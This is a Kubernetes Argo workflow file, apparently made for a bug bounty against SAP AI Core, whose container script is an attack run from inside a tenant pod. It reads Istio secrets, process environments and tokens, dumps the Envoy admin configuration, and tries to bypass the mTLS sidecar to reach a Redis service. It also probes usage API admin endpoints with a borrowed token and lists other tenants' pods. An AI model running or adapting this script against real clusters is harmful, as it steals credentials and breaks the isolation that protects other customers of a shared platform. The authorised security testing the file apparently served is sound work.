apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "23.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V23 ISTIO BYPASS + USAGE API ==="
        
        echo "=== ISTIO PROXY SDS UNIX SOCKET ==="
        ls -la /var/run/secrets/ 2>/dev/null
        ls -laR /var/run/secrets/istio/ 2>/dev/null
        ls -la /etc/certs/ 2>/dev/null
        find / -maxdepth 5 -name "istio-token" 2>/dev/null
        find / -maxdepth 5 -name "root-cert.pem" 2>/dev/null
        find / -maxdepth 5 -name "SDS" 2>/dev/null
        
        echo "=== CHECK PROC FOR ENVOY KEYS ==="
        ls /proc/*/fd 2>/dev/null | head -5
        cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
        
        echo ""
        echo "=== ENVOY ADMIN - MODIFY CLUSTER ROUTING ==="
        echo "--- Current outbound config for Redis ---"
        curl -s http://localhost:15000/config_dump 2>&1 | grep -A20 "redis.aicore" | head -25
        
        echo ""
        echo "--- Try to disable mTLS via Envoy admin ---"
        curl -s -X POST "http://localhost:15000/logging?connection=debug" 2>&1 | head -5
        
        echo ""
        echo "=== BYPASS ENVOY - USE LOCALHOST ADMIN TO PROXY ==="
        echo "--- Direct TCP through envoy internal listener ---"
        curl -s --connect-to redis.aicore.svc.cluster.local:6379:127.0.0.1:15001 http://redis.aicore.svc.cluster.local:6379/ 2>&1 | head -c 500
        
        echo ""
        echo "=== USAGE API WITH XSUAA TOKEN ==="
        XSUAA_TOKEN=$(cat /tmp/xsuaa-token.txt 2>/dev/null)
        if [ -z "$XSUAA_TOKEN" ]; then
          echo "No XSUAA token file, using env"
          XSUAA_TOKEN="$AICORE_TOKEN"
        fi
        
        echo "=== USAGE API ENDPOINTS ==="
        for ep in "/" "/api" "/v1" "/v2" "/health" "/healthz" "/metrics" "/swagger" "/api-docs" "/openapi" "/usage" "/v2/usage" "/v2/admin/usage"; do
          CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://usage-api-service.usage-api.svc.cluster.local${ep}" 2>&1)
          echo "$CODE $ep"
        done
        
        echo ""
        echo "=== ML-TRACKING WITH OUR JWT ==="
        echo "--- env vars with token ---"
        env | grep -i token | head -5
        env | grep -i auth | head -5
        env | grep -i aicore | head -5
        
        echo ""
        echo "=== ENVOY STATS ==="
        curl -s http://localhost:15000/stats 2>&1 | grep -E "(upstream_cx|downstream_cx|ssl|mtls)" | head -30
        
        echo ""
        echo "=== ENVOY CONFIG DUMP - SECRETS SECTION SIZE ==="
        FULL=$(curl -s http://localhost:15000/config_dump 2>&1)
        echo "Full config: $(echo $FULL | wc -c) bytes"
        echo "$FULL" | grep -c "inline_bytes"
        echo "Unique services in routes:"
        echo "$FULL" | grep -oE '"cluster": "[^"]*"' | sort -u | head -30
        
        echo ""
        echo "=== KSM NEW CHECK - BB PARTICIPANT PODS ==="
        curl -s http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics 2>&1 | grep -E "kube_pod_info.*rg-" | grep -v "rg-3ba0e0a4" | head -20
        
        echo ""
        echo "=== OTEL COLLECTOR ==="
        curl -s http://otel-collector.opentelemetry.svc.cluster.local:4317/ 2>&1 | head -c 500
        curl -s http://otel-collector.opentelemetry.svc.cluster.local:4318/ 2>&1 | head -c 500
        curl -s http://otel-collector.opentelemetry.svc.cluster.local:4318/v1/traces 2>&1 | head -c 500
        
        echo "=== V23 DONE ==="
